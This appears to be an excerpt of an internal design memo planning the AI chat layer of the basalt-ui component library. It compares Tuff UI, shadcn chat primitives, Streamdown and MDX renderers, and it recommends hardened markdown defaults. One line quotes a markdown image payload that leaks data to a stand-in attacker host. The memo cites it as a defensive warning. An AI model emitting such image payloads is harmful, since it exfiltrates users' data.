## 0. Headline

- **The AI layer splits cleanly in two audiences and v3 must serve both from ONE definition**: (1) the coding agent that builds the consumer app (skills, rules, llms.txt, registry/MCP) and (2) the runtime agent inside the app (catalog -> prompt -> JSON Schema -> validate -> render). Every serious 2026 stack solves only one of the two; basalt's differentiator is lint + skills (audience 1), so the runtime catalog (audience 2) should be derived from the same `defineBlock` so they cannot drift.
- **Delete our AI runtime, keep our AI safety and anatomy.** `pkg/agent/**` is 6,438 non-test lines (+10,440 test) re-implementing part accumulation/replay that AI SDK `useChat`/`resume` and AG-UI already own, and has zero external adopters (section 6). The valuable parts are the hardened markdown, fence-renderer seam, tool-state union and chat anatomy.
- **Tuff UI is a 3-day-old, single-author, Radix + `motion` copy-in kit.** Worth reading for anatomy and for its llms-full.txt/registry build pattern, not as a dependency; the factory console already evaluated three of its components and rebuilt the anatomy on Basalt tokens (`shadcn-factory-console.md:169`).
- **shadcn now ships the chat primitives officially** (base-nova: `message`, `bubble`, `message-scroller`, `trace`, `code-block`, `attachment`, `questionnaire`, `marker`; headless `@shadcn/react` 0.3.1). v3 should restyle those, not rebuild them.
- **Never evaluate MDX from a model.** For model output the only safe custom-component paths are (a) a fenced block holding schema-validated JSON, (b) a tool call/data part carrying the same JSON. MDX stays build-time for docs. One `defineBlock` can feed MDX docs, fenced blocks, tool-call blocks and registry metadata.
- **Streamdown 2.7.1 ships permissive security defaults** (verified in dist: `allowedImagePrefixes:["*"]`, `allowedLinkPrefixes:["*"]`, `allowedProtocols:["*"]`, `allowDataImages:true`). If v3 adopts it, the wrapper must pin our hardened defaults; we already have them (`pkg/content/url-hardening.ts`, `contentTrust`).

## 2. Tuff UI in depth (https://tuffui.com, github.com/yurigdesigner/tuffui)

**What it is (Fact).** "Free components for AI interfaces": a shadcn registry of 78 catalogue entries (registry.json: 81 items = 71 `registry:ui`, 7 `registry:block` screens, theme, `motion-tokens` lib, `use-mock-run` hook). Built with Next 16.4 on Cloudflare, React 19.3, Tailwind v4, `radix-ui` 1.8, `motion` 14.9, Phosphor icons, cmdk, shiki 4 (repo `package.json`). Install: `npx shadcn@latest add https://tuffui.com/r/<name>.json`.

**Sections (Fact, `llms.txt`).** Foundations 24 (surface, buttons, controls, tooltip, menu, popover, sheet, toast, select, tabs, skeleton, slider, date, drop zone...), Conversation 13 (streaming message, chat thread, composer, branches, feedback, agent question, user message, conversation list, suggestions, attachments, code block, source list, agent status), Tools & Approvals 5 (approval queue, tool call block, file changes, terminal output, MCP servers), Planning 2, Observability 4 (run trace flame graph, eval results, lap timer, eval race), Settings & Usage 4 (context window meter, memory panel, usage summary, rate limits), Interactive Answers 19 (chart card + 11 exotic chart kinds, data table, stat grid, form card, result carousel, slot picker, confirmation card, JSON viewer, artifact panel), Screens 7.

**Architecture (Fact).**

**What is good (Judgement).** (1) The single serializable `data` view-model is exactly the shape a tool output has; it is why the components map to generative UI with no glue. (2) Documentation as a build artifact (prop tables -> llms-full) is the cheapest "available to coding agents" wiring and basalt already has its twin (`packages/basalt-ui/llms.txt`, 1,333 lines). (3) Container-query screens are the right primitive for a chat column that lives in a side panel. (4) Approval queue anatomy (risk grouping, bulk grant, scope once/session/always, 5 s undo from resolved log) is a better design than the AI Elements `Confirmation` row. (5) Deterministic mock runs are the right test seam.

**Limits (Fact unless marked).**

- No machine schema: types exist only as TS snippets in markdown; no zod/JSON Schema, no runtime validation, no MCP server, no skills. Judgement: it is documentation for a human or coding agent, not a runtime catalog.
- `StreamingMessage` is not markdown: `Content` splits on blank lines and parses only `` `code` `` and `**bold**`, and wraps every word in a `motion.span` (`streaming-message.tsx`, `Content`). Unusable for real agent output; heavy DOM on long answers (Judgement).
- `ArtifactPanel` takes `preview: ReactNode`, contradicting its own serializable-data pattern.
- Decorative chart kinds (Lap Timer, Eval Race, Iso Bars, Hex Density, Blast Radius) conflict with the brief (TanStack Charts only, colour earned). `/r/` is `Disallow`ed in `robots.txt` (observation).
- Radix + `motion` + Phosphor + a private theme: factory console rejected pulling `stat-grid`, `agent-question`, `tool-approval-queue` for exactly these reasons and "anatomy rebuilt on Basalt tokens instead" (`shadcn-factory-console.md:169`).

**Take / skip for v3 (Judgement).** Take: approval queue, agent question (maps to shadcn `questionnaire`), source list (footnotes + panel), context window meter, tool call block, artifact panel (versions + preview/source), checkpoint timeline, form card (agent-requested form), `docs.ts -> llms-full` generation, imports-derived registry deps, mock-run test seam, container-query rule. Skip: observability toys, exotic charts, motion-per-word, message branches (until a consumer asks).

## 4. Topic by topic

### 4.1 Streaming markdown

- Fact: our `Markdown` already does block-split + memoize + `remend` on the in-flight tail (`pkg/content/markdown.tsx:36`, `block-split.ts` 102 lines), `streaming` is a mode and `contentTrust` the security policy (`markdown.tsx:20-22,94-108`), URL allowlists with remend's `streamdown:incomplete-link|image` sentinels rejected (`url-hardening.ts:14-17,41`). That is Streamdown's pipeline hand-built on react-markdown 10.1 + remend 1.4.0.
- Fact: epos rendered markdown with `skipHtml`, `safeUrl` (https/mailto/relative), never fetched `<img>` (`NoImage`), mermaid fence waits 400 ms of stable source (`shadcn-epos-teamchat.md:121`). Streamdown's own docs warn the same exfiltration class (`![](https://attacker/p?d=...)`), and its default allows it.
- Judgement, engine choice: adopt Streamdown as engine only if a one-day spike passes four gates: (1) wrapper pins `allowedImagePrefixes=[]`/same-origin, `allowDataImages:false`, `defaultOrigin`, `allowedProtocols` (https/mailto/tel) under `contentTrust="untrusted"` which becomes the DEFAULT; (2) `rehype-raw` path proven inert (our current path is skip-html); (3) fence-renderer parity (`settledOnly`, malformed fence never throws, `fence-block.tsx:16-27`) via `components.code` + `useIsCodeFenceIncomplete`; (4) bundle: markdown stack stays lazy (`pkg/content` documents lazy optional peers). Gain: block memoization, shiki/mermaid/math plugins, copy/download/fullscreen controls, Tailwind-native styles. Cost: 0.x-style churn risk (KaTeX advisory pin #655, `preprocessCustomTags` bugs #706). If a gate fails, keep react-markdown + remend (also fine; same repair layer).
- Fact: epos is NOT token-streaming ("prose arrives whole", `shadcn-epos-teamchat.md:107`); components must treat `streaming` as optional, `settled` as the contract.

### 4.2 MDX and custom components in model output

- Fact: `@mdx-js/mdx evaluate` "evals JavaScript"; `next-mdx-remote` CVE-2026-0969 (CVSS 8.8, RCE, fixed 6.0.0) and the repo was archived 2026-04-09; `safe-mdx` 2.1.0 is the only no-eval MDX renderer found and has a stream parser that errors on partial input. AI Elements `JSXPreview` (react-jsx-parser 2.4.1) renders model JSX with a `components` allowlist but evaluates attribute expressions and exposes `bindings`.
- Fact: our repo has NO MDX today (`grep` hits are comments/`ArticleLayout` etc.; `url-hardening.ts:6` says "MDX content is authored, not hardened"). Consumers use `Markdown` seams (obsidian: 7 override components, `consumer-obsidian.md:208`).
- Judgement (the rule for v3): three trust tiers, one component set.

| Tier              | Source                    | Syntax                                                                              | Executes code | Where                                                                                           |
| ----------------- | ------------------------- | ----------------------------------------------------------------------------------- | ------------- | ----------------------------------------------------------------------------------------------- |
| Authored          | repo files                | MDX compiled at build time                                                          | yes (trusted) | docs sites, jkrumm.com-class static sites; `mdxComponents` map exported from the block registry |
| Model, structured | tool call / `data-*` part | catalog JSON                                                                        | no            | `show`-style tool; `BlockRenderer`                                                              |
| Model, inline     | markdown text             | fenced block ` ```basalt:stat ` + JSON, zod-validated, unknown -> plain `CodeBlock` | no            | `fenceRenderers` seam (already exists)                                                          |

No remark-directive path in v1 (its own README warns against unknown authors); `JSXPreview`-style free JSX is left to the consumer behind `renderers`, never shipped.

### 4.3 Tool-call rendering and approvals

- Fact, three state vocabularies for one idea:

| Stack                 | States                                                                                                                                                                                                                        |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| AI SDK 7 `ToolUIPart` | `input-streaming`, `input-available`, `approval-requested`, `approval-responded`, `output-available`, `output-error` (+ `output-denied` in the chatbot guide but not in the type reference; verify against installed `.d.ts`) |
| TanStack AI           | `awaiting-input`, `input-streaming`, `input-complete`, `approval-requested`, `approval-responded`, `complete`/`error` with sibling `tool-result` part (`outcome: denied\|cancelled`)                                          |
| AG-UI                 | `TOOL_CALL_START/ARGS/END/RESULT` events                                                                                                                                                                                      |

Ours: 7 states mirroring AI SDK incl. `output-denied`, tolerance for missing `toolCallId` on settled states (`pkg/agent/parts.ts:106-176`).

- Fact: epos renders only two tool names, `step` (folded into one timeline "N steps . 42 s") and `show` (generative block in the prose flow); "a failed `show` is not a failed step" (`shadcn-epos-teamchat.md:109`). Tuff and AI Elements render every tool as a card.
- Judgement: v3 `ToolView` = one presentational component over a 6-value view-model `{pending, running, awaiting-approval, done, error, denied}` + `name, args, result, durationMs`; mapping from each SDK is a ~30-line consumer function (AI SDK mapper shipped, others documented in the skill). Rendering policy: default = folded rail under the answer (our `ToolChip` anatomy), `toolRenderers: { show: BlockRenderer }` by name for in-flow blocks, `approval` always interrupts into an `ApprovalCard` (risk, scope once/session/always, edited args as TanStack's `editedArgs`, undo window as Tuff).

### 4.4 Reasoning traces

- Fact: AI SDK `reasoning` part `{text, state?: streaming|done}`; AG-UI `REASONING_*` family (`THINKING_*` deprecated); TanStack `REASONING_*`; shadcn `Trace`/`TraceCollapsible`; Tuff "Thought for 4s" with `durationMs`. Our `ReasoningPart` has `offset` splice (`pkg/agent/parts.ts:72-79`).
- Judgement: one `Reasoning` over shadcn `trace`; open while `streaming`, auto-collapse on settle, label "Thought for Ns" from first-to-last delta timing, text rendered as muted markdown through the SAME untrusted `Markdown`; never render encrypted/`reasoning-file`/redacted payloads.

### 4.5 Citations

- Fact: AI SDK `source-url {sourceId,url,title?}` and `source-document {sourceId,mediaType,title,filename?}`; shadcn Sources dedupes by url, hostname fallback for title; Tuff `SourceList` footnotes + panel "which claims each source backs"; epos mention links `@[Title](kind:id)`.
- Judgement: `Sources` (collapsed list under the answer) + inline `[n]` markers resolved by a markdown plugin against the message's source parts (index = order of first appearance, missing index renders plain text). All hrefs pass the link allowlist; **no favicon/thumbnail fetch** (privacy + exfil; hostname text only), matching epos's `NoImage` rule. Hover preview optional later.

### 4.6 Artifacts

- Fact: AI Elements `artifact`, `web-preview`, `sandbox`, `jsx-preview` have no shadcn replacement; CopilotKit "Open Generative UI" and MCP Apps use sandboxed iframes; epos shares ONE renderer for chat, report pane, signed view, print (`repo/docs/one-renderer.md`, iframes `sandbox` w/o same-origin, `shadcn-epos-teamchat.md:121`); factory console has `artifact-panel.tsx` + `/artifacts/$id`; Tuff `ArtifactPanel` = versions oldest-first, preview/source tabs, restore, download.
- Judgement: `ArtifactPanel` lives in the PageAside region (ASIDE-SPEC, already reserved for inspectors), data = `{title, kind, versions:[{id,label,createdAt,note,source}]}` all serializable; native previews for `kind: markdown | blocks | code`; `html`/`react` previews are a consumer renderer behind a documented sandbox contract (`sandbox` without `allow-same-origin`, CSP, no `window` globals). Do not ship a JS sandbox.

### 4.7 Streaming UX

- Fact (epos): answer body `aria-live="polite" aria-busy`, `role="log"` viewport (`Messages.tsx:443`); skeleton after 100 ms; per-chat scroll memory; stall watchdog 45 s vs 15 s heartbeat; jump-to-latest merged with "answered below". shadcn `message-scroller` (headless in `@shadcn/react`) plus `data-pending-scroll:invisible`; our `stick-to-bottom.tsx` + `use-stick-to-bottom`.
- Judgement: keep `aria-live`/`aria-busy`/`role=log` as a lint-checked contract on the thread container; spike `@shadcn/react/message-scroller` against `use-stick-to-bottom` (keep ours if the spike loses).

## 5. The wiring that makes a component library available to agents (core question)

Four channels, each with a different consumer; none replaces another (Fact: each exists in the products above).

**Channel 3 design (Judgement, derived from epos + json-render core).**

- Shape: `defineBlock({ name, description, props: zod, limits, render, sample })`. `defineCatalog([...])` returns `{ prompt(), jsonSchema(), validate(spec), renderer, mdxComponents }`. Discriminated union by `type` (epos: table, chart, stat, list, board, diagram, callout, ticket, vega, layout; `show/schema.ts:22,273`), caps identical server/client (<=20 cols, <=500 rows, <=4 series), `layout` the only container (depth <=2).
- Why not adopt json-render core outright: flat spec + JSONL patches + `$state` expression DSL + actions is a large attack and learning surface for ~10 leaf blocks; it is 0.22, vendor-led, and its shadcn pack is Radix. Why not assistant-ui spec mode: ties catalogs to its toolkit. Both are zod-compatible, so `catalog.toJsonRender()` is a cheap escape hatch (judgement, unproven; would need a spike).
- Partial rendering: tool args stream; render partial JSON while `input-streaming` (CopilotKit uses `partialJSONParse`; AI SDK `input-streaming` "input may be partial"), fall back to a reserved-height skeleton until `validate()` passes (epos reserved height + per-block error boundary + quiet "could not be displayed", `shadcn-epos-teamchat.md:110`).
- Contract with a non-TS server (epos: Python): emit `catalog.schema.json` as a committed, generated artifact; ship `expectCatalogContract(serverSchema)` test helper (epos `schema.contract.test.ts:9-60`).
- Blocks wrap existing basalt components (Stat/KPI card, `CartesianChart` kinds, `BasaltDataTable`, board, callout), so agent output is on-brand by construction: the model can only choose among components that already obey the spacing/density laws.
- Interactivity back to the agent: blocks emit typed events (`submit`, `approve`, `followup`) through one `onBlockEvent` prop; wiring to `addToolOutput`/`resolveInterrupt`/AG-UI is the consumer's runtime (Tuff Form Card: `agent.sendToolResult(call.id, values)`).

## 7. Proposed v3 AI surface

### 7.2 Module shape (Judgement)

- `basalt-ui/ai` single subpath (headless parts + `toolView` + catalog engine, zero UI deps) and `basalt-ui/ai/ui` (components) so a catalog-only server or test can import without React DOM; markdown stays `basalt-ui/content`. Budget targets, to be gated in `check-budgets`: ai entry <= ~2.5k non-test lines (vs 11.0k agent+content today), no eager shiki/mermaid/streamdown in the entry chunk (epos rejected assistant-ui toolkit partly because registry would enter the entry chunk, `shadcn-epos-teamchat.md:114`).
- Distribution interlock: if v3 ships components as a shadcn-style registry instead of an npm package, `ai` ships both: catalog engine as npm (data + logic must version-lock with the server contract), components as registry items. Depends on the distribution decision made elsewhere in the plan.

## 9. Open questions and risks

- **Streamdown vs react-markdown+remend** (spike, gates in 4.1). Owner only needs to know it is a dependency choice with a security caveat; not a product decision.
- **Own catalog vs json-render core underneath.** Recommendation: own `defineBlock` (~300 lines), zod-compatible so json-render/assistant-ui adapters are possible. Reverse if a consumer needs agent-generated stateful forms (then the `$state/actions` DSL earns its weight). Needs a named consumer; today only epos has any (a `show` tool).
- **Who is the AI consumer?** Census says no basalt consumer uses AI UI; epos (held off basalt) and the factory console (artifacts) are the only evidence. Adopt-or-delete says ship the smallest surface (parts, markdown, blocks, ToolRail/Approval/Sources) and let epos validate before widening. Owner decision: is epos the committed first consumer of `basalt-ui/ai`?
- **MCP server for basalt itself** (docs + registry + catalog lookup tools, like assistant-ui's `mcp-docs-server`): useful but a new always-on surface; defer until registry + llms.txt exist.
- Unverified: AI SDK `output-denied` in the installed `ToolUIPart` type (docs conflict); `useRenderTool` signatures in CopilotKit v2; `json-render` action binding (`on` vs props-level `action`); whether `@shadcn/react` 0.3.x is API-stable (0.x). Treat all as spike items.
- Risk: AI SDK 7, TanStack AI 1.x and AG-UI 1.0 all went stable within the last two months (Jun-Oct 2026); part names and state vocabularies will still move. Mitigation is the thin `toolView`/parts layer, not a bigger abstraction.
